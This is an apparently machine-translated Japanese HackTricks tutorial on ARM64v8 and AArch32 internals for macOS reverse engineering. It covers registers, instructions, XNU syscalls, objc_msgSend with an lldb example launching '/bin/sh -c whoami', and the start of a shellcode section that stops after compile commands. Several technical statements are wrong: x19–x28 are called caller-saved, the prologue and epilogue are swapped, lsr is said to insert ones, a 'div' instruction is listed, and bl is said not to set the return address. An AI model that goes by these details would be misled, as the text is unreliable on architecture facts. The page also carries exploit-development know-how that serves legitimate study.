# ARM64v8の紹介

{{#include ../../../banners/hacktricks-training.md}}

## **例外レベル - EL (ARM64v8)**

ARMv8アーキテクチャでは、実行レベルは例外レベル（EL）として知られ、実行環境の特権レベルと機能を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的を持っています。

1. **EL0 - ユーザーモード**:
- これは最も特権の低いレベルで、通常のアプリケーションコードを実行するために使用されます。
- EL0で実行されるアプリケーションは互いに、またシステムソフトウェアから隔離されており、セキュリティと安定性が向上します。
2. **EL1 - オペレーティングシステムカーネルモード**:
- ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
- EL1はEL0よりも多くの特権を持ち、システムリソースにアクセスできますが、システムの整合性を確保するためにいくつかの制限があります。
3. **EL2 - ハイパーバイザーモード**:
- このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で複数のオペレーティングシステム（それぞれ独自のEL1で）を管理できます。
- EL2は仮想化環境の隔離と制御のための機能を提供します。
4. **EL3 - セキュアモニターモード**:
- これは最も特権の高いレベルで、セキュアブートや信頼できる実行環境にしばしば使用されます。
- EL3はセキュア状態と非セキュア状態（セキュアブート、信頼できるOSなど）間のアクセスを管理および制御できます。

これらのレベルを使用することで、ユーザーアプリケーションから最も特権の高いシステムソフトウェアまで、システムのさまざまな側面を構造化された安全な方法で管理できます。ARMv8の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に隔離し、システムのセキュリティと堅牢性を向上させるのに役立ちます。

## **レジスタ (ARM64v8)**

ARM64には**31の汎用レジスタ**があり、`x0`から`x30`までラベル付けされています。各レジスタは**64ビット**（8バイト）の値を格納できます。32ビットの値のみを必要とする操作では、同じレジスタを32ビットモードで`w0`から`w30`の名前でアクセスできます。

1. **`x0`**から**`x7`** - これらは通常、スクラッチレジスタとして使用され、サブルーチンにパラメータを渡すために使用されます。
- **`x0`**は関数の戻りデータも持ちます。
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`**から**`x15`** - より一時的なレジスタで、ローカル変数にしばしば使用されます。
4. **`x16`**と**`x17`** - **手続き内呼び出しレジスタ**。即時値のための一時的なレジスタです。また、間接関数呼び出しやPLT（手続きリンクテーブル）スタブにも使用されます。
- **`x16`**は**macOS**における**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - **プラットフォームレジスタ**。汎用レジスタとして使用できますが、一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています：Windowsの現在のスレッド環境ブロックへのポインタ、またはLinuxカーネルの現在実行中のタスク構造へのポインタ。
6. **`x19`**から**`x28`** - これらは呼び出し側が保存するレジスタです。関数はこれらのレジスタの値を呼び出し元のために保持しなければならず、スタックに保存され、呼び出し元に戻る前に回復されます。
7. **`x29`** - スタックフレームを追跡するための**フレームポインタ**。関数が呼び出されると新しいスタックフレームが作成され、**`x29`**レジスタは**スタックに保存され**、**新しい**フレームポインタアドレス（**`sp`**アドレス）が**このレジスタに保存されます**。
- このレジスタは**汎用レジスタ**としても使用できますが、通常は**ローカル変数**への参照として使用されます。
8. **`x30`**または**`lr`** - **リンクレジスタ**。`BL`（リンク付き分岐）または`BLR`（レジスタへのリンク付き分岐）命令が実行されるときに**戻りアドレス**を保持し、**`pc`**値をこのレジスタに保存します。
- 他のレジスタと同様に使用することもできます。
- 現在の関数が新しい関数を呼び出す場合、`lr`を上書きするため、最初にスタックに保存します。これがエピローグです（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存し、スペースを生成し、新しい`fp`を取得）し、最後に回復します。これがプロローグです（`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を回復し、戻ります）。
9. **`sp`** - **スタックポインタ**。スタックのトップを追跡するために使用されます。
- **`sp`**の値は常に少なくとも**クワッドワード**の**アライメント**を維持する必要があります。さもなければアライメント例外が発生する可能性があります。
10. **`pc`** - **プログラムカウンタ**。次の命令を指します。このレジスタは例外生成、例外戻り、分岐を通じてのみ更新できます。このレジスタを読み取ることができる唯一の通常の命令は、分岐付きリンク命令（BL、BLR）で、**`pc`**アドレスを**`lr`**（リンクレジスタ）に保存します。
11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では**`wzr`**とも呼ばれます。ゼロ値を簡単に取得するために使用できます（一般的な操作）または**`subs`**を使用して比較を行うために使用できます（例：**`subs XZR, Xn, #10`**は結果のデータをどこにも保存しません（**`xzr`**に）。

**`Wn`**レジスタは**`Xn`**レジスタの**32ビット**バージョンです。

### SIMDおよび浮動小数点レジスタ

さらに、最適化された単一命令複数データ（SIMD）操作や浮動小数点演算に使用できる**128ビット長の32のレジスタ**があります。これらはVnレジスタと呼ばれますが、**64**ビット、**32**ビット、**16**ビット、**8**ビットでも動作し、その場合は**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。

### システムレジスタ

**数百のシステムレジスタ**、特別目的レジスタ（SPR）とも呼ばれ、**プロセッサ**の動作を**監視**および**制御**するために使用されます。\
これらは専用の特別命令**`mrs`**および**`msr`**を使用してのみ読み取ったり設定したりできます。

特別レジスタ**`TPIDR_EL0`**および**`TPIDDR_EL0`**は、リバースエンジニアリングで一般的に見られます。`EL0`の接尾辞は、レジスタにアクセスできる**最小例外**を示します（この場合、EL0は通常の例外（特権）レベルで、通常のプログラムが実行されます）。\
これらは通常、メモリの**スレッドローカルストレージ**領域のベースアドレスを保存するために使用されます。通常、最初のものはEL0で実行されるプログラムに対して読み書き可能ですが、2番目のものはEL0から読み取ることができ、EL1から書き込むことができます（カーネルのように）。

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0をx0に読み取る`
- `msr TPIDR_EL0, X0 ; x0をTPIDR_EL0に書き込む`

### **PSTATE**

**PSTATE**は、オペレーティングシステムが可視化する**`SPSR_ELx`**特別レジスタに直列化された複数のプロセスコンポーネントを含み、Xはトリガーされた例外の**権限** **レベル**を示します（これにより、例外が終了したときにプロセス状態を回復できます）。\
これらはアクセス可能なフィールドです：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`**、および**`V`**条件フラグ：
- **`N`**は、操作が負の結果をもたらしたことを意味します。
- **`Z`**は、操作がゼロをもたらしたことを意味します。
- **`C`**は、操作がキャリーしたことを意味します。
- **`V`**は、操作が符号付きオーバーフローをもたらしたことを意味します：
- 2つの正の数の合計が負の結果をもたらします。
- 2つの負の数の合計が正の結果をもたらします。
- 減算では、大きな負の数が小さな正の数から引かれた場合（またはその逆）、結果が与えられたビットサイズの範囲内で表現できない場合。
- 明らかに、プロセッサは操作が符号付きかどうかを知らないため、CとVを操作でチェックし、符号付きまたは符号なしの場合にキャリーが発生したかどうかを示します。

> [!WARNING]
> すべての命令がこれらのフラグを更新するわけではありません。**`CMP`**や**`TST`**のようなものは更新し、**`ADDS`**のようにsサフィックスを持つ他のものも更新します。

- 現在の**レジスタ幅（`nRW`）フラグ**：フラグが0の値を保持している場合、プログラムは再開時にAArch64実行状態で実行されます。
- 現在の**例外レベル**（**`EL`**）：EL0で実行される通常のプログラムは値0を持ちます。
- **単一ステップ**フラグ（**`SS`**）：デバッガによって使用され、例外を通じて**`SPSR_ELx`**内でSSフラグを1に設定することによって単一ステップを実行します。プログラムは1ステップ実行し、単一ステップ例外を発生させます。
- **不正例外**状態フラグ（**`IL`**）：特権ソフトウェアが無効な例外レベル転送を実行したときにマークするために使用され、このフラグは1に設定され、プロセッサは不正状態例外をトリガーします。
- **`DAIF`**フラグ：これらのフラグは、特権プログラムが特定の外部例外を選択的にマスクできるようにします。
- **`A`**が1の場合、**非同期中断**がトリガーされることを意味します。**`I`**は外部ハードウェア**割り込み要求**（IRQ）に応答するように設定します。Fは**高速割り込み要求**（FIR）に関連しています。
- **スタックポインタ選択**フラグ（**`SPS`**）：EL1以上で実行される特権プログラムは、自分のスタックポインタレジスタとユーザーモデルのスタックポインタ（例：`SP_EL1`と`EL0`）の間でスワップできます。この切り替えは、**`SPSel`**特別レジスタに書き込むことによって行われます。これはEL0からは行えません。

## **呼び出し規約 (ARM64v8)**

ARM64の呼び出し規約では、関数への**最初の8つのパラメータ**はレジスタ**`x0`から`x7`**に渡されます。**追加の**パラメータは**スタック**に渡されます。**戻り**値はレジスタ**`x0`**に返され、**128ビット長**の場合は**`x1`**にも返されます。**`x19`**から**`x30`**および**`sp`**レジスタは、関数呼び出しの間に**保持**されなければなりません。

アセンブリで関数を読むときは、**関数のプロローグとエピローグ**を探します。**プロローグ**は通常、**フレームポインタ（`x29`）の保存**、**新しいフレームポインタの設定**、および**スタックスペースの割り当て**を含みます。**エピローグ**は通常、**保存されたフレームポインタの復元**と**関数からの戻り**を含みます。

### Swiftにおける呼び出し規約

Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)で見つけることができます。

## **一般的な命令 (ARM64v8)**

ARM64命令は一般的に**形式 `opcode dst, src1, src2`**を持ち、**`opcode`**は実行される**操作**（`add`、`sub`、`mov`など）、**`dst`**は結果が格納される**宛先**レジスタ、**`src1`**および**`src2`**は**ソース**レジスタです。即時値もソースレジスタの代わりに使用できます。

- **`mov`**: **値を1つの**レジスタから別のレジスタに**移動**します。
- 例：`mov x0, x1` — これは`x1`から`x0`に値を移動します。
- **`ldr`**: **メモリ**から**レジスタ**に値を**ロード**します。
- 例：`ldr x0, [x1]` — これは`x1`が指すメモリ位置から`x0`に値をロードします。
- **オフセットモード**：元のポインタに影響を与えるオフセットが示されます。例えば：
- `ldr x2, [x1, #8]`、これは`x1 + 8`から`x2`に値をロードします。
- `ldr x2, [x0, x1, lsl #2]`、これは配列`x0`から位置`x1`（インデックス）\* 4のオブジェクトを`x2`にロードします。
- **プレインデックスモード**：これは元に計算を適用し、結果を取得し、元の位置に新しい元を保存します。
- `ldr x2, [x1, #8]!`、これは`x1 + 8`を`x2`にロードし、`x1`に`x1 + 8`の結果を保存します。
- `str lr, [sp, #-4]!`、リンクレジスタを`sp`に保存し、レジスタ`sp`を更新します。
- **ポストインデックスモード**：これは前のものと似ていますが、メモリアドレスにアクセスし、その後オフセットが計算されて保存されます。
- `ldr x0, [x1], #8`、`x1`を`x0`にロードし、`x1`を`x1 + 8`で更新します。
- **PC相対アドレッシング**：この場合、ロードするアドレスはPCレジスタに相対的に計算されます。
- `ldr x1, =_start`、これは`_start`シンボルが始まるアドレスを現在のPCに関連付けて`x1`にロードします。
- **`str`**: **レジスタ**から**メモリ**に値を**保存**します。
- 例：`str x0, [x1]` — これは`x0`の値を`x1`が指すメモリ位置に保存します。
- **`ldp`**: **レジスタのペアをロード**します。この命令は**連続したメモリ**位置から**2つのレジスタ**を**ロード**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えることによって形成されます。
- 例：`ldp x0, x1, [x2]` — これは`x2`および`x2 + 8`のメモリ位置から`x0`と`x1`をロードします。
- **`stp`**: **レジスタのペアを保存**します。この命令は**連続したメモリ**位置に**2つのレジスタ**を**保存**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えることによって形成されます。
- 例：`stp x0, x1, [sp]` — これは`sp`および`sp + 8`のメモリ位置に`x0`と`x1`を保存します。
- `stp x0, x1, [sp, #16]!` — これは`sp+16`および`sp + 24`のメモリ位置に`x0`と`x1`を保存し、`sp`を`sp+16`で更新します。
- **`add`**: 2つのレジスタの値を**加算**し、結果をレジスタに保存します。
- 構文：add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 宛先
- Xn2 -> オペランド1
- Xn3 | #imm -> オペランド2（レジスタまたは即時）
- \[shift #N | RRX] -> シフトを実行するか、RRXを呼び出します。
- 例：`add x0, x1, x2` — これは`x1`と`x2`の値を加算し、結果を`x0`に保存します。
- `add x5, x5, #1, lsl #12` — これは4096に等しい（1を12回シフト）-> 1 0000 0000 0000 0000
- **`adds`** これは`add`を実行し、フラグを更新します。
- **`sub`**: 2つのレジスタの値を**減算**し、結果をレジスタに保存します。
- **`add`**の**構文**を確認してください。
- 例：`sub x0, x1, x2` — これは`x1`から`x2`の値を減算し、結果を`x0`に保存します。
- **`subs`** これは`sub`のようにフラグを更新します。
- **`mul`**: **2つのレジスタ**の値を**乗算**し、結果をレジスタに保存します。
- 例：`mul x0, x1, x2` — これは`x1`と`x2`の値を乗算し、結果を`x0`に保存します。
- **`div`**: 1つのレジスタの値を別のレジスタで割り、結果をレジスタに保存します。
- 例：`div x0, x1, x2` — これは`x1`を`x2`で割り、結果を`x0`に保存します。
- **`lsl`**、**`lsr`**、**`asr`**、**`ror`, `rrx`**:
- **論理シフト左**：末尾から0を追加し、他のビットを前方に移動させます（n回2倍）。
- **論理シフト右**：先頭に1を追加し、他のビットを後方に移動させます（符号なしでn回2で割る）。
- **算術シフト右**：**`lsr`**のように、最上位ビットが1の場合は0を追加するのではなく、**1を追加します**（符号付きでn回2で割る）。
- **右に回転**：**`lsr`**のように、右から削除されたものを左に追加します。
- **拡張付き右回転**：**`ror`**のように、キャリーフラグを「最上位ビット」として扱います。したがって、キャリーフラグはビット31に移動し、削除されたビットはキャリーフラグに移動します。
- **`bfm`**: **ビットフィールド移動**、これらの操作は**値から`0...n`ビットをコピー**し、**`m..m+n`**の位置に配置します。**`#s`**は**最左ビット**の位置を指定し、**`#r`**は**右に回転する量**を指定します。
- ビットフィールド移動：`BFM Xd, Xn, #r`
- 符号付きビットフィールド移動：`SBFM Xd, Xn, #r, #s`
- 符号なしビットフィールド移動：`UBFM Xd, Xn, #r, #s`
- **ビットフィールドの抽出と挿入**：レジスタからビットフィールドをコピーし、別のレジスタにコピーします。
- **`BFI X1, X2, #3, #4`** X1の3ビット目からX2の4ビットを挿入します。
- **`BFXIL X1, X2, #3, #4`** X2の3ビット目から4ビットを抽出し、X1にコピーします。
- **`SBFIZ X1, X2, #3, #4`** X2から4ビットを符号拡張し、ビット位置3からX1に挿入します。右のビットはゼロにします。
- **`SBFX X1, X2, #3, #4`** X2の3ビット目から4ビットを抽出し、符号拡張してX1に配置します。
- **`UBFIZ X1, X2, #3, #4`** X2から4ビットをゼロ拡張し、ビット位置3からX1に挿入します。右のビットはゼロにします。
- **`UBFX X1, X2, #3, #4`** X2の3ビット目から4ビットを抽出し、ゼロ拡張された結果をX1に配置します。
- **符号拡張Xへの拡張**：値の符号を拡張（または符号なしバージョンでは単に0を追加）して、操作を実行できるようにします：
- **`SXTB X1, W2`** W2からX1にバイトの符号を拡張します（`W2`は`X2`の半分です）。
- **`SXTH X1, W2`** W2からX1に16ビット数の符号を拡張します。
- **`SXTW X1, W2`** W2からX1にバイトの符号を拡張します。
- **`UXTB X1, W2`** W2からX1にバイトに0を追加します（符号なし）。
- **`extr`**：指定された**ペアのレジスタを連結**してビットを抽出します。
- 例：`EXTR W3, W2, W1, #3` これは**W1+W2を連結**し、**W2のビット3からW1のビット3まで**を取得してW3に保存します。
- **`cmp`**: **2つのレジスタを比較**し、条件フラグを設定します。これは**`subs`**のエイリアスで、宛先レジスタをゼロレジスタに設定します。`m == n`かどうかを知るのに便利です。
- **`subs`**と同じ構文をサポートします。
- 例：`cmp x0, x1` — これは`x0`と`x1`の値を比較し、条件フラグを適切に設定します。
- **`cmn`**: **負のオペランドを比較**します。この場合、これは**`adds`**のエイリアスで、同じ構文をサポートします。`m == -n`かどうかを知るのに便利です。
- **`ccmp`**: 条件付き比較で、これは前の比較が真であった場合にのみ実行され、特にnzcvビットを設定します。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2かつx3 < x4の場合、funcにジャンプします。
- これは**`ccmp`**が**前の`cmp`が`NE`であった場合にのみ実行されるため**、そうでない場合はビット`nzcv`が0に設定され（`blt`比較を満たさない）、使用されます。
- これは`ccmn`としても使用できます（同じですが負の、`cmp`対`cmn`のように）。
- **`tst`**: 比較の値が両方とも1であるかどうかをチェックします（結果をどこにも保存せずにANDSのように動作します）。これは、レジスタの値と値を比較し、指定された値のビットのいずれかが1であるかどうかを確認するのに便利です。
- 例：`tst X1, #7` X1の最後の3ビットのいずれかが1であるかを確認します。
- **`teq`**: 結果を破棄するXOR操作。
- **`b`**: 無条件分岐。
- 例：`b myFunction`
- これはリンクレジスタに戻りアドレスを設定しないため（戻る必要があるサブルーチン呼び出しには適していません）。
- **`bl`**: **リンク付き分岐**、**サブルーチンを呼び出す**ために使用されます。**戻りアドレスを`x30`に保存**します。
- 例：`bl myFunction` — これは関数`myFunction`を呼び出し、戻りアドレスを`x30`に保存します。
- これはリンクレジスタに戻りアドレスを設定しないため（戻る必要があるサブルーチン呼び出しには適していません）。
- **`blr`**: **レジスタへのリンク付き分岐**、ターゲットが**レジスタ**で指定される**サブルーチンを呼び出す**ために使用されます。戻りアドレスを`x30`に保存します。
- 例：`blr x1` — これは`x1`に含まれるアドレスの関数を呼び出し、戻りアドレスを`x30`に保存します。
- **`ret`**: **サブルーチンから戻る**、通常は**`x30`**のアドレスを使用します。
- 例：`ret` — これは現在のサブルーチンから戻り、`x30`の戻りアドレスを使用します。
- **`b.<cond>`**: 条件付き分岐。
- **`b.eq`**: **等しい場合に分岐**、前の`cmp`命令に基づいて。
- 例：`b.eq label` — 前の`cmp`命令が2つの等しい値を見つけた場合、これは`label`にジャンプします。
- **`b.ne`**: **等しくない場合に分岐**。この命令は条件フラグをチェックし（前の比較命令によって設定された）、比較された値が等しくない場合、ラベルまたはアドレスに分岐します。
- 例：`cmp x0, x1`命令の後、`b.ne label` — `x0`と`x1`の値が等しくない場合、これは`label`にジャンプします。
- **`cbz`**: **ゼロで比較し分岐**。この命令はレジスタをゼロと比較し、等しい場合はラベルまたはアドレスに分岐します。
- 例：`cbz x0, label` — `x0`の値がゼロの場合、これは`label`にジャンプします。
- **`cbnz`**: **非ゼロで比較し分岐**。この命令はレジスタをゼロと比較し、等しくない場合はラベルまたはアドレスに分岐します。
- 例：`cbnz x0, label` — `x0`の値が非ゼロの場合、これは`label`にジャンプします。
- **`tbnz`**: ビットをテストし、非ゼロの場合に分岐。
- 例：`tbnz x0, #8, label`
- **`tbz`**: ビットをテストし、ゼロの場合に分岐。
- 例：`tbz x0, #8, label`
- **条件付き選択操作**：これらは条件ビットに応じて動作が変わる操作です。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 真の場合、X0 = X1、偽の場合、X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 真の場合、Xd = Xn + 1、偽の場合、Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 真の場合、Xd = NOT(Xn)、偽の場合、Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 真の場合、Xd = Xn、偽の場合、Xd = - Xm
- `cneg Xd, Xn, cond` -> 真の場合、Xd = - Xn、偽の場合、Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 真の場合、Xd = 1、偽の場合、Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 真の場合、Xd = \<すべて1>、偽の場合、Xd = 0
- **`adrp`**: シンボルの**ページアドレスを計算**し、レジスタに保存します。
- 例：`adrp x0, symbol` — これは`symbol`のページアドレスを計算し、`x0`に保存します。
- **`ldrsw`**: メモリから**符号付き32ビット**値を**ロード**し、**64ビットに符号拡張**します。
- 例：`ldrsw x0, [x1]` — これは`x1`が指すメモリ位置から符号付き32ビット値をロードし、64ビットに符号拡張して`x0`に保存します。
- **`stur`**: **レジスタ値をメモリ位置に保存**し、別のレジスタからのオフセットを使用します。
- 例：`stur x0, [x1, #4]` — これは`x0`の値を`x1`のアドレスより4バイト大きいメモリアドレスに保存します。
- **`svc`** : **システムコール**を行います。「スーパーバイザコール」を意味します。この命令をプロセッサが実行すると、**ユーザーモードからカーネルモードに切り替わり**、**カーネルのシステムコール処理**コードがあるメモリの特定の位置にジャンプします。

- 例：

```armasm
mov x8, 93  ; システムコール番号93をレジスタx8にロードします。
mov x0, 0   ; 終了ステータスコード0をレジスタx0にロードします。
svc 0       ; システムコールを行います。
```

### **関数プロローグ**

1. **リンクレジスタとフレームポインタをスタックに保存**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **新しいフレームポインタを設定する**: `mov x29, sp` (現在の関数のために新しいフレームポインタを設定します)
3. **ローカル変数のためにスタック上にスペースを割り当てる** (必要な場合): `sub sp, sp, <size>` (ここで `<size>` は必要なバイト数です)

### **関数エピローグ**

1. **ローカル変数を解放する (割り当てられている場合)**: `add sp, sp, <size>`
2. **リンクレジスタとフレームポインタを復元する**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (呼び出し元に制御を返すためにリンクレジスタのアドレスを使用)

## AARCH32 実行状態

Armv8-Aは32ビットプログラムの実行をサポートしています。**AArch32**は**2つの命令セット**のいずれかで実行できます：**`A32`**と**`T32`**で、**`interworking`**を介してそれらの間を切り替えることができます。\
**特権**のある64ビットプログラムは、特権の低い32ビットプログラムへの例外レベル転送を実行することによって**32ビット**プログラムの**実行をスケジュール**できます。\
64ビットから32ビットへの遷移は、例外レベルの低下と共に発生することに注意してください（例えば、EL1の64ビットプログラムがEL0のプログラムをトリガーする）。これは、`AArch32`プロセススレッドが実行される準備ができたときに**`SPSR_ELx`**特別レジスタの**ビット4を1に設定**することによって行われ、`SPSR_ELx`の残りは**`AArch32`**プログラムのCPSRを格納します。その後、特権プロセスは**`ERET`**命令を呼び出し、プロセッサはCPSRに応じて**`AArch32`**に遷移し、A32またはT32に入ります。**

**`interworking`**はCPSRのJビットとTビットを使用して行われます。`J=0`および`T=0`は**`A32`**を意味し、`J=0`および`T=1`は**T32**を意味します。これは基本的に、命令セットがT32であることを示すために**最下位ビットを1に設定する**ことに相当します。\
これは**interworkingブランチ命令**の間に設定されますが、PCが宛先レジスタとして設定されているときに他の命令で直接設定することもできます。例：

別の例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

16個の32ビットレジスタ（r0-r15）があります。**r0からr14**は**任意の操作**に使用できますが、そのうちいくつかは通常予約されています：

- **`r15`**: プログラムカウンタ（常に）。次の命令のアドレスを含みます。A32では現在 + 8、T32では現在 + 4です。
- **`r11`**: フレームポインタ
- **`r12`**: 手続き内呼び出しレジスタ
- **`r13`**: スタックポインタ
- **`r14`**: リンクレジスタ

さらに、レジスタは**`バンクレジスタ`**にバックアップされます。これは、例外処理や特権操作において**迅速なコンテキストスイッチ**を行うためにレジスタの値を保存する場所であり、毎回手動でレジスタを保存および復元する必要を回避します。\
これは、例外が発生したプロセッサモードの**`CPSR`**から**`SPSR`**にプロセッサ状態を**保存することによって**行われます。例外から戻ると、**`CPSR`**は**`SPSR`**から復元されます。

### CPSR - 現在のプログラムステータスレジスタ

AArch32では、CPSRはAArch64の**`PSTATE`**と似たように機能し、例外が発生したときに後で実行を復元するために**`SPSR_ELx`**に保存されます：

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分かれています：

- アプリケーションプログラムステータスレジスタ（APSR）：算術フラグで、EL0からアクセス可能
- 実行状態レジスタ：プロセスの動作（OSによって管理される）。

#### アプリケーションプログラムステータスレジスタ（APSR）

- **`N`**、**`Z`**、**`C`**、**`V`**フラグ（AArch64と同様）
- **`Q`**フラグ：特定の飽和算術命令の実行中に**整数飽和が発生した**場合に1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまでその値を保持します。さらに、その値を暗黙的にチェックする命令はなく、手動で読み取る必要があります。
- **`GE`**（以上または等しい）フラグ：これは、"並列加算"や"並列減算"などのSIMD（Single Instruction, Multiple Data）操作で使用されます。これらの操作は、単一の命令で複数のデータポイントを処理することを可能にします。

例えば、**`UADD8`**命令は**4つのバイトペア**（2つの32ビットオペランドから）を並列に加算し、結果を32ビットレジスタに格納します。その後、これらの結果に基づいて**`APSR`**内の**`GE`**フラグを**設定します**。各GEフラグは、バイトペアの加算が**オーバーフローした**かどうかを示します。

**`SEL`**命令は、これらのGEフラグを使用して条件付きアクションを実行します。

#### 実行状態レジスタ

- **`J`**および**`T`**ビット：**`J`**は0であるべきで、**`T`**が0の場合は命令セットA32が使用され、1の場合はT32が使用されます。
- **ITブロック状態レジスタ**（`ITSTATE`）：これらは10-15および25-26のビットです。**`IT`**接頭辞のグループ内の命令の条件を保存します。
- **`E`**ビット：**エンディアンネス**を示します。
- **モードおよび例外マスクビット**（0-4）：現在の実行状態を決定します。**5番目**のビットは、プログラムが32ビット（1）または64ビット（0）で実行されているかを示します。他の4つは、**現在使用中の例外モード**を表します（例外が発生し、それが処理されているとき）。設定された番号は、他の例外がこの処理中にトリガーされた場合の**現在の優先度**を示します。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：特定の例外は、ビット**`A`**、`I`、`F`を使用して無効にできます。**`A`**が1の場合、**非同期中断**がトリガーされることを意味します。**`I`**は外部ハードウェア**割り込み要求**（IRQ）に応答するように設定します。Fは**高速割り込み要求**（FIR）に関連しています。

## macOS

### BSDシステムコール

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を確認してください。BSDシステムコールは**x16 > 0**になります。

### Machトラップ

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)の`mach_trap_table`と[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)のプロトタイプを確認してください。Machトラップの最大数は`MACH_TRAP_TABLE_COUNT` = 128です。Machトラップは**x16 < 0**になるため、前のリストから番号を**マイナス**で呼び出す必要があります：**`_kernelrpc_mach_vm_allocate_trap`**は**`-10`**です。

これら（およびBSD）システムコールを呼び出す方法を見つけるために、ディスアセンブラで**`libsystem_kernel.dylib`**を確認することもできます：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
注意してください、**Ida** と **Ghidra** はキャッシュを通過させるだけで **特定の dylibs** をデコンパイルすることもできます。

> [!TIP]
> 時には **ソースコード** を確認するよりも **`libsystem_kernel.dylib`** の **デコンパイルされた** コードをチェックする方が簡単です。なぜなら、いくつかのシステムコール（BSD と Mach）のコードはスクリプトを介して生成されているため（ソースコードのコメントを確認）、dylib では何が呼び出されているかを見つけることができます。

### machdep コール

XNU はマシン依存の別のタイプのコールをサポートしています。これらのコールの数はアーキテクチャによって異なり、コールや数が一定であることは保証されていません。

### comm ページ

これはカーネル所有のメモリページで、すべてのユーザープロセスのアドレス空間にマッピングされています。これは、ユーザーモードからカーネル空間への遷移を、カーネルサービスのためのシステムコールを使用するよりも速くすることを目的としています。この遷移は非常に非効率的になるためです。

例えば、`gettimeofdate` コールは、comm ページから直接 `timeval` の値を読み取ります。

### objc_msgSend

この関数は Objective-C または Swift プログラムで非常に一般的に見られます。この関数は、Objective-C オブジェクトのメソッドを呼び出すことを可能にします。

パラメータ（[ドキュメントの詳細](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)）:

- x0: self -> インスタンスへのポインタ
- x1: op -> メソッドのセレクタ
- x2... -> 呼び出されたメソッドの残りの引数

したがって、この関数への分岐の前にブレークポイントを置くと、lldb で何が呼び出されているかを簡単に見つけることができます（この例では、オブジェクトがコマンドを実行する `NSConcreteTask` からオブジェクトを呼び出します）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼び出されたときに `/tmp/msgSends-pid` のようなファイルにログを記録できます。
>
> さらに、**`OBJC_HELP=1`** を設定し、任意のバイナリを呼び出すことで、特定のObjc-Cアクションが発生したときに **log** するために使用できる他の環境変数を見ることができます。

この関数が呼び出されると、指定されたインスタンスの呼び出されたメソッドを見つける必要があります。そのために、さまざまな検索が行われます：

- 楽観的キャッシュ検索を実行：
- 成功した場合、完了
- runtimeLockを取得（読み取り）
- If (realize && !cls->realized) クラスを実現
- If (initialize && !cls->initialized) クラスを初期化
- クラス自身のキャッシュを試す：
- 成功した場合、完了
- クラスメソッドリストを試す：
- 見つかった場合、キャッシュを埋めて完了
- スーパークラスキャッシュを試す：
- 成功した場合、完了
- スーパークラスメソッドリストを試す：
- 見つかった場合、キャッシュを埋めて完了
- If (resolver) メソッドリゾルバを試し、クラス検索から繰り返す
- まだここにいる場合（= 他のすべてが失敗した場合）フォワーダーを試す

### Shellcodes

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
